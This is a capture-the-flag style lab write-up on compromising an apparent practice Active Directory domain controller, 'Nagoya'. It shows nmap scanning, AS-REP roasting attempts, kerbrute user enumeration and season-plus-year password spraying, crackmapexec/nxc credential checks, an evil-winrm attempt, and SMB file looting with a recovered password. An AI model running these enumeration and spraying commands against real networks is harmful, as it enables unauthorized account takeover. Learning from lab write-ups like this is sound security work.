lab nagoya

target  192.168.55.21

```bash
sudo nmap -sC -sV nagoya -sT -vvv -p- -Pn -T5 --min-rate=5000
```
```bash
PORT      STATE SERVICE           REASON  VERSION
53/tcp    open  domain            syn-ack Simple DNS Plus
80/tcp    open  http              syn-ack Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 9200225B96881264E6481C77D69C622C
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Nagoya Industries - Nagoya
88/tcp    open  kerberos-sec      syn-ack Microsoft Windows Kerberos (server time: 2025-05-15 14:08:14Z)
135/tcp   open  msrpc             syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack
464/tcp   open  kpasswd5?         syn-ack
593/tcp   open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack
3268/tcp  open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack
3389/tcp  open  ms-wbt-server     syn-ack Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
5985/tcp  open  http              syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            syn-ack .NET Message Framing
49666/tcp open  msrpc             syn-ack Microsoft Windows RPC
49668/tcp open  msrpc             syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc             syn-ack Microsoft Windows RPC
49681/tcp open  msrpc             syn-ack Microsoft Windows RPC
49691/tcp open  msrpc             syn-ack Microsoft Windows RPC
49698/tcp open  msrpc             syn-ack Microsoft Windows RPC
49717/tcp open  msrpc             syn-ack Microsoft Windows RPC
```

<img width="1062" height="21" alt="image" src="https://github.com/user-attachments/assets/390cb2ac-6112-422e-9d13-e48a83697fff" />

As you can see, this machine is likely a Windows Domain Controller, since port 88/tcp (Kerberos) is open — which is typically used for Active Directory authentication.

<img width="436" height="30" alt="image" src="https://github.com/user-attachments/assets/9647a2cd-29cb-4e21-a55f-203d08506d09" />


First, we add the domain name nagoya-industries.com and the DC hostname nagoya to our /etc/hosts file.


<img width="710" height="29" alt="image" src="https://github.com/user-attachments/assets/d591077e-f448-485a-bf1f-289f01eaa179" />

we can see that there is a web port 80 is open. Open it in web browser and investigate


<img width="1229" height="763" alt="image" src="https://github.com/user-attachments/assets/2379637e-d5a3-4353-ab1d-399a1d538d06" />

We then check the /Team tab and notice an absolutely enormous list of possible users.

<img width="1222" height="809" alt="image" src="https://github.com/user-attachments/assets/e792dabf-3742-49d3-b430-ea2116d554c0" />

Making Wordlists

I just copy these users name and save a file named users.txt

<img width="367" height="666" alt="image" src="https://github.com/user-attachments/assets/eea418bb-8002-4b36-bc42-3c9fe4d09060" />


now lets use the impacket script, GetNPUsers to check if any of the user’s are AS-REP roast vulnerable — Which turned out not.

```bash
impacket-GetNPUsers nagoya-industries.com/ -usersfile users.txt
```
<img width="974" height="604" alt="image" src="https://github.com/user-attachments/assets/d11c8143-0e8a-4ae3-8114-0383a726fac0" />


I used the impacket script, GetNPUsers to check if any of the user’s are AS-REP roast vulnerable — WHich turned out not.

Also confirmed that the naming format is the correct one using kerbrute :

```bash
kerbrute userenum -d nagoya-industries.com --dc 192.168.55.21 users.txt
```
<img width="936" height="785" alt="image" src="https://github.com/user-attachments/assets/619d81a0-4972-435f-a8b5-3c9a5a60bffd" />

So now we got valid users, but it’s too much to go through with rockyou.txt , I was honestly lost , but I knew the only way was to guess or brute force a password. I didn’t want to spend too much time and decided to use the first hint for the box in Offsec’s lab.

<img width="828" height="42" alt="image" src="https://github.com/user-attachments/assets/46941be1-c600-4aea-b5d4-3886405f891f" />

Are you serious, seasons + years lol.

Okay OSINT-ing into this box was not my thought of process or methodology at all.

<img width="1598" height="873" alt="image" src="https://github.com/user-attachments/assets/608c7ea0-bda3-461e-b465-1d4bef44adf3" />

So with got a the year ‘2023’, now to guess the season.

<img width="828" height="446" alt="image" src="https://github.com/user-attachments/assets/6214bf73-b359-42f7-b2fd-1f8b90a30854" />

Let’s start with spring first. I’ll use kerbrute again to password spray the users :
```bash
kerbrute passwordspray --dc 192.168.55.21 -d nagoya-industries.com users.txt "spring2023"
```
<img width="1000" height="273" alt="image" src="https://github.com/user-attachments/assets/345b6c43-2927-4053-a9c4-49ae8fe699e8" />


```bash
note command later might be useful
command with nxc to spray the usernames and passwords, and used grep "+" to filter out valid credentials:

nxc smb 192.168.123.21 -u domUsers.txt -p pass.txt --continue-on-success | grep "+"
```

Didn’t work lol, let’s try with a capital s.
<img width="990" height="296" alt="image" src="https://github.com/user-attachments/assets/a001b2e3-515f-4da7-85fb-500844512e59" />

Got out first credential :

Craig.Carr:Spring2023=

Password Spraying

Now that we had a set of matching creds we could go ahead and start spraying the creds to see what’s up.

now let’s enumerate the user using crackmapexec :

```bash
crackmapexec smb 192.168.55.21 -u Craig.Carr -d nagoya-industries.com  -p "Spring2023" --shares
```
another command
```bash
nxc rdp nagoya -u 'craig.carr' -p 'Spring2023'
```

<img width="1057" height="247" alt="image" src="https://github.com/user-attachments/assets/49e1cd0c-766c-44de-9d0c-80bcbaa764b7" />

Alright SMB works,

I like to check if we can get a shell via winrm :

crackmapexec smb 192.168.55.21 -u Craig.Carr -d nagoya-industries.com  -p "Spring2023"

<img width="1056" height="101" alt="image" src="https://github.com/user-attachments/assets/ca6103ba-c98d-427a-8d2a-fcf503537a56" />

I like to check if we can get a shell via winrm :

```bash
evil-winrm -i 192.168.55.21 -u craig.carr -p "Spring2023"
```
<img width="1254" height="281" alt="image" src="https://github.com/user-attachments/assets/c9eab2e9-321e-44af-831b-bd3f26a5db66" />

No winrm access :(.

Since we get SMB access let’s connect using SMBclient :

<img width="909" height="68" alt="image" src="https://github.com/user-attachments/assets/027d751c-1a6f-4ade-9553-19b100c36434" />

password as we know:  Spring2023

<img width="856" height="788" alt="image" src="https://github.com/user-attachments/assets/37add856-386b-43e1-84bd-475c61240a2f" />

Some of the files could potentially leak some information for us to pivot.

I ended up getting them all and checking them out.

to download file from smb to linux
```bash
get ResetPassword.exe.config
```
<img width="1255" height="89" alt="image" src="https://github.com/user-attachments/assets/0f88ba92-bb74-4407-a957-72af1f8ab620" />

<img width="922" height="190" alt="image" src="https://github.com/user-attachments/assets/1162fdd2-1ce1-4dff-be7b-f877690f65b6" />





